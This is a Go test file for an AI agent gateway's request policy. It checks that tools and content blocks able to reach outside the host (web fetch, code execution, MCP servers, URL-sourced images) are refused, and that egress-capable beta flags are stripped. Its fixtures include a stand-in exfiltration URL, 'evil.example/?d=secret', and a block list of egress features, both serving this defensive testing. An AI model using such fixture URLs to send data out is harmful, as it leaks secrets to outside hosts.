package agent

import (
	"github.com/Deikus-LXXVII/rubi/internal/home/agent/roles"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func gwPolicy(t *testing.T, allowWebSearch bool) (*Gateway, *upstreamRec) {
	t.Helper()
	up := newRecUpstream(t, nil)
	g, tf := gwWith(t, up, nil)
	g.Close()
	g2, err := StartGateway(GatewayConfig{Secret: testSecret, TokenFile: tf, AllowWebSearch: allowWebSearch, upstream: up.srv.URL, client: up.srv.Client()})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(g2.Close)
	return g2, up
}

func post(t *testing.T, g *Gateway, path, body string) (int, string) {
	t.Helper()
	req, _ := http.NewRequest("POST", "http://"+g.Addr()+path, strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+testSecret)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var sb strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		sb.Write(buf[:n])
		if err != nil {
			break
		}
	}
	return resp.StatusCode, sb.String()
}

func TestGatewayBodyPolicy(t *testing.T) {
	cases := []struct {
		name, body string
		webSearch  bool
		want       int
	}{
		{"no tools", `{"model":"m","messages":[]}`, false, 200},
		{"null tools", `{"tools":null}`, false, 200},
		{"client tool without type", `{"tools":[{"name":"Read","input_schema":{}}]}`, false, 200},
		{"custom tool", `{"tools":[{"type":"custom","name":"x"}]}`, false, 200},
		{"client bash and editor", `{"tools":[{"type":"bash_20250124","name":"bash"},{"type":"text_editor_20250728","name":"e"},{"type":"computer_20250124","name":"c"}]}`, false, 200},
		{"tool search", `{"tools":[{"type":"tool_search_tool_regex_20251119","name":"s"}]}`, false, 200},
		{"web_fetch denied", `{"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}`, true, 403},
		{"code execution denied", `{"tools":[{"name":"a"},{"type":"code_execution_20250825","name":"code_execution"}]}`, true, 403},
		{"unknown type denied", `{"tools":[{"type":"brand_new_20300101","name":"x"}]}`, true, 403},
		{"odd type denied", `{"tools":[{"type":7,"name":"x"}]}`, true, 403},
		{"mcp toolset denied", `{"tools":[{"type":"mcp_toolset","mcp_server_name":"s"}]}`, true, 403},
		{"mcp_servers denied", `{"mcp_servers":[{"type":"url","url":"https://example.org/mcp","name":"s"}],"messages":[]}`, true, 403},
		{"mcp_servers empty list still denied", `{"mcp_servers":[]}`, true, 403},
		{"container denied", `{"container":"abc"}`, true, 403},
		{"case-folded key denied", `{"MCP_Servers":[]}`, true, 403},
		{"repeated key denied", `{"tools":[],"tools":[{"type":"web_fetch_20250910"}]}`, true, 403},
		{"repeated type denied", `{"tools":[{"type":"custom","type":"web_fetch_20250910"}]}`, true, 403},
		{"not json denied", `nope`, true, 403},
		{"web_search denied by default", `{"tools":[{"type":"web_search_20250305","name":"web_search"}]}`, false, 403},
		{"web_search allowed by policy", `{"tools":[{"type":"web_search_20250305","name":"web_search"}]}`, true, 200},
		{"web_fetch denied even with web search allowed", `{"tools":[{"type":"web_search_20250305"},{"type":"web_fetch_20250910"}]}`, true, 403},
	}
	for _, c := range cases {
		for _, path := range []string{"/v1/messages", "/v1/messages/count_tokens"} {
			g, up := gwPolicy(t, c.webSearch)
			code, body := post(t, g, path, c.body)
			if code != c.want {
				t.Errorf("%s %s: status %d, want %d (%s)", c.name, path, code, c.want, body)
			}
			if c.want == 403 {
				if up.count() != 0 {
					t.Errorf("%s: a refused request reached the upstream", c.name)
				}
				if !strings.Contains(body, `"permission_error"`) || strings.Contains(body, fakeToken) {
					t.Errorf("%s: error body %q", c.name, body)
				}
			} else if up.count() != 1 || up.reqs[0].body != c.body {
				t.Errorf("%s: the body wasn't forwarded unchanged", c.name)
			}
		}
	}
}

func TestGatewayContentPolicy(t *testing.T) {
	const url = `{"type":"url","url":"https://evil.example/?d=secret"}`
	msg := func(content string) string {
		return `{"model":"m","messages":[{"role":"user","content":` + content + `}]}`
	}
	cases := []struct {
		name, body string
		webSearch  bool
		want       int
	}{
		{"string content", msg(`"hi"`), false, 200},
		{"text block", msg(`[{"type":"text","text":"hi"}]`), false, 200},
		{"base64 image", msg(`[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAA"}}]`), false, 200},
		{"base64 pdf", msg(`[{"type":"document","source":{"type":"base64","media_type":"application/pdf","data":"AAAA"}}]`), false, 200},
		{"text document", msg(`[{"type":"document","source":{"type":"text","media_type":"text/plain","data":"x"}}]`), false, 200},
		{"nested content document", msg(`[{"type":"document","source":{"type":"content","content":[{"type":"text","text":"x"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AA"}}]}}]`), false, 200},
		{"tool use and result", msg(`[{"type":"tool_use","id":"t","name":"Read","input":{}},{"type":"tool_result","tool_use_id":"t","content":[{"type":"text","text":"x"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AA"}}]}]`), false, 200},
		{"tool result string", msg(`[{"type":"tool_result","tool_use_id":"t","content":"ok"}]`), false, 200},
		{"thinking", msg(`[{"type":"thinking","thinking":"x","signature":"s"},{"type":"redacted_thinking","data":"d"}]`), false, 200},
		{"search_result label", msg(`[{"type":"search_result","source":"https://example.org","title":"t","content":[{"type":"text","text":"x"}]}]`), false, 200},
		{"system string", `{"system":"be nice","messages":[]}`, false, 200},
		{"system blocks", `{"system":[{"type":"text","text":"be nice"}],"messages":[]}`, false, 200},
		{"web search history allowed", msg(`[{"type":"server_tool_use","id":"s","name":"web_search","input":{}},{"type":"web_search_tool_result","tool_use_id":"s","content":[]}]`), true, 200},
		{"web search history denied", msg(`[{"type":"web_search_tool_result","tool_use_id":"s","content":[]}]`), false, 403},
		{"web search use denied", msg(`[{"type":"server_tool_use","id":"s","name":"web_search","input":{}}]`), false, 403},
		{"web_fetch use denied", msg(`[{"type":"server_tool_use","id":"s","name":"web_fetch","input":{}}]`), true, 403},
		{"web_fetch result denied", msg(`[{"type":"web_fetch_tool_result","tool_use_id":"s","content":{}}]`), true, 403},
		{"mcp_tool_use denied", msg(`[{"type":"mcp_tool_use","id":"s","name":"x","server_name":"y","input":{}}]`), true, 403},
		{"container_upload denied", msg(`[{"type":"container_upload","file_id":"f"}]`), true, 403},
		{"unknown block denied", msg(`[{"type":"brand_new"}]`), true, 403},
		{"block without type denied", msg(`[{"text":"x"}]`), true, 403},
		{"case-folded type denied", msg(`[{"Type":"text","text":"x"}]`), true, 403},
		{"url image denied", msg(`[{"type":"image","source":` + url + `}]`), false, 403},
		{"url document denied", msg(`[{"type":"document","source":` + url + `}]`), false, 403},
		{"url image in tool_result denied", msg(`[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":` + url + `}]}]`), false, 403},
		{"url in nested document denied", msg(`[{"type":"document","source":{"type":"content","content":[{"type":"image","source":` + url + `}]}}]`), false, 403},
		{"url image in system denied", `{"system":[{"type":"image","source":` + url + `}],"messages":[]}`, false, 403},
		{"file source denied", msg(`[{"type":"document","source":{"type":"file","file_id":"file_1"}}]`), false, 403},
		{"unknown source denied", msg(`[{"type":"image","source":{"type":"s3","bucket":"b"}}]`), false, 403},
		{"source without type denied", msg(`[{"type":"image","source":{"url":"https://evil.example/"}}]`), false, 403},
		{"repeated source type denied", msg(`[{"type":"image","source":{"type":"base64","type":"url","url":"https://evil.example/"}}]`), false, 403},
		{"case-folded source denied", msg(`[{"type":"image","Source":` + url + `}]`), false, 403},
		{"messages not a list denied", `{"messages":{"a":1}}`, false, 403},
		{"deep nesting denied", msg(strings.Repeat(`[{"type":"tool_result","content":`, 12) + `"x"` + strings.Repeat(`}]`, 12)), false, 403},
	}
	for _, c := range cases {
		g, up := gwPolicy(t, c.webSearch)
		code, body := post(t, g, "/v1/messages", c.body)
		if code != c.want {
			t.Errorf("%s: status %d, want %d (%s)", c.name, code, c.want, body)
		}
		if c.want == 403 && (up.count() != 0 || !strings.Contains(body, `"permission_error"`)) {
			t.Errorf("%s: refused request not refused cleanly", c.name)
		}
		if c.want == 200 && up.count() != 1 {
			t.Errorf("%s: not forwarded", c.name)
		}
	}
}

func TestGatewayBodyBudget(t *testing.T) {
	old := gatewayBodyBudget
	gatewayBodyBudget = 100 << 10
	defer func() { gatewayBodyBudget = old }()
	g, up := gwPolicy(t, false)
	big := `{"messages":[{"role":"user","content":"` + strings.Repeat("a", 200<<10) + `"}]}`
	if code, _ := post(t, g, "/v1/messages", big); code != http.StatusServiceUnavailable || up.count() != 0 {
		t.Errorf("over budget: status %d, upstream saw %d", code, up.count())
	}
	g.budgetMu.Lock()
	held := g.held
	g.budgetMu.Unlock()
	if held != 0 {
		t.Errorf("budget not released: %d held", held)
	}
	small := `{"messages":[{"role":"user","content":"hi"}]}`
	if code, _ := post(t, g, "/v1/messages", small); code != 200 {
		t.Errorf("after the budget is free again: status %d", code)
	}
	g.budgetMu.Lock()
	held = g.held
	g.budgetMu.Unlock()
	if held != 0 {
		t.Errorf("budget not released after success: %d held", held)
	}
}

func TestGatewayBodyCap(t *testing.T) {
	g, up := gwPolicy(t, false)
	big := `{"messages":[{"role":"user","content":"` + strings.Repeat("a", gatewayMaxBody) + `"}]}`
	code, _ := post(t, g, "/v1/messages", big)
	if code != http.StatusRequestEntityTooLarge || up.count() != 0 {
		t.Errorf("an oversize body: status %d, upstream saw %d", code, up.count())
	}
}

func TestRoleAllowsWebSearch(t *testing.T) {
	for _, c := range []struct {
		name string
		r    *roles.Role
		want bool
	}{
		{"nil", nil, false},
		{"no tools", &roles.Role{}, false},
		{"other tools", &roles.Role{Tools: []string{"Read", "WebFetch"}}, false},
		{"granted", &roles.Role{Tools: []string{"Read", "WebSearch"}}, true},
		{"granted and denied", &roles.Role{Tools: []string{"WebSearch"}, Deny: []roles.Deny{{Rule: "WebSearch"}}}, false},
		{"unrelated deny", &roles.Role{Tools: []string{"WebSearch"}, Deny: []roles.Deny{{Rule: "Bash(git push:*)"}}}, true},
	} {
		if got := roleAllowsWebSearch(c.r); got != c.want {
			t.Errorf("%s: %v", c.name, got)
		}
	}
}

// The betas the bundled CLI knows, less the ones that reach outside, all pass; the others are dropped.
func TestGatewayKeepsEveryBetaTheCLIKnows(t *testing.T) {
	known := []string{"claude-code-20250219", "oauth-2025-04-20", "advanced-tool-use-2025-11-20", "advisor-tool-2026-03-01",
		"afk-mode-2026-01-31", "agent-memory-2026-07-22", "auto-mode-classifier-2026-07-16", "cache-diagnosis-2026-04-07",
		"cache-keepalive-2026-09-03", "context-1m-2025-08-07", "context-hint-2026-04-09", "context-management-2025-06-27",
		"dreaming-2026-04-21", "effort-2025-11-24", "extended-cache-ttl-2025-04-11", "fallback-credit-2026-06-01",
		"fast-mode-2026-02-01", "fine-grained-tool-streaming-2025-05-14", "inline-tools-2026-09-15",
		"interleaved-thinking-2025-05-14", "memory-2026-07-22", "message-threads-2026-08-12",
		"mid-conversation-system-2026-04-07", "mid-conversation-system-clear-at-2026-08-21",
		"mid-conversation-tool-changes-2026-07-01", "per-turn-control-2026-07-01", "prompt-caching-evict-2026-05-12",
		"prompt-caching-scope-2026-01-05", "redact-thinking-2026-02-12", "server-side-fallback-2026-06-01",
		"server-side-fallback-2026-07-01", "structured-outputs-2025-12-15", "task-budgets-2026-03-13",
		"thinking-binding-controls-2026-08-01", "thinking-display-updates-2026-08-18", "thinking-resumption-2026-07-17",
		"thinking-token-count-2026-05-13", "timing-2026-09-09", "token-counting-2024-11-01", "tool-search-tool-2025-10-19"}
	egress := []string{"mcp-servers-2025-12-04", "mcp-tunnels-2026-06-22", "mcp-client-2025-11-20", "files-api-2025-04-14",
		"code-execution-2025-08-25", "web-fetch-2025-09-10", "managed-agents-2026-04-01", "environments-2025-11-01",
		"ccr-byoc-2025-07-29", "ccr-triggers-2026-01-30", "oidc-federation-2026-04-01", "message-batches-2024-09-24",
		"user-profiles-2026-08-18", "bedrock-2023-05-31", "vertex-2023-10-16", "computer-use-2025-01-24", "made-up-2030-01-01"}
	want := strings.Join(append(append([]string{}, known...), "x"), ",")
	want = strings.TrimSuffix(want, ",x")
	if got := filterBeta([]string{strings.Join(known, ",")}, false); got != want {
		t.Errorf("a known beta was dropped or reordered:\n%s\n%s", got, want)
	}
	all := append(append([]string{}, egress...), known...)
	got := filterBeta([]string{strings.Join(all, ",")}, false)
	for _, e := range egress {
		if strings.Contains(got, e) {
			t.Errorf("%s was passed on", e)
		}
	}
	for _, k := range known {
		if !strings.Contains(got, k) {
			t.Errorf("%s was dropped", k)
		}
	}
	if strings.Contains(filterBeta([]string{"web-search-2025-03-05"}, false), "web-search") {
		t.Error("web-search beta passed without the policy")
	}
	if !strings.Contains(filterBeta([]string{"web-search-2025-03-05"}, true), "web-search-2025-03-05") {
		t.Error("web-search beta dropped with the policy")
	}
}

// Real request bodies of the bundled Claude Code CLI (from the runner's scripted-API integration tests).
func TestGatewayPassesRealClaudeCodeBodies(t *testing.T) {
	for _, f := range []string{"claude_code_first_turn.json", "claude_code_tool_result.json"} {
		b, err := os.ReadFile(filepath.Join("testdata", f))
		if err != nil {
			t.Fatal(err)
		}
		for _, ws := range []bool{false, true} {
			if why := checkBody(b, ws); why != "" {
				t.Errorf("%s (webSearch=%v): %s", f, ws, why)
			}
		}
	}
}
